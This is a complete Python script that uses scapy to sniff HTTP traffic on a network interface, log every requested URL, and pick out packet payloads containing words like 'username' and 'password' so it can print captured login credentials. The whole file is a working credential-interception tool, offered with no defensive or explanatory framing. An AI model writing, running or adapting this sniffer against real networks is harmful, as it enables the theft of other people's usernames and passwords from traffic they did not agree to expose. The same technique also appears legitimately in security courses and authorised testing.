#!/usr/bin/env python
import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def get_url(packet):
    host = packet[http.HTTPRequest].Host.decode()
    path = packet[http.HTTPRequest].Path.decode()
    return host + path

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        try:
            load = packet[scapy.Raw].load.decode()
            keywords = ["username", "uname", "user", "login", "password", "pass"]
            for keyword in keywords:
                if keyword in load:
                    return load
        except UnicodeDecodeError:
            pass  # Ignore packets that can't be decoded

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request >> " + url)

        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible username/password >> " + login_info + "\n\n")

sniff("eth0")

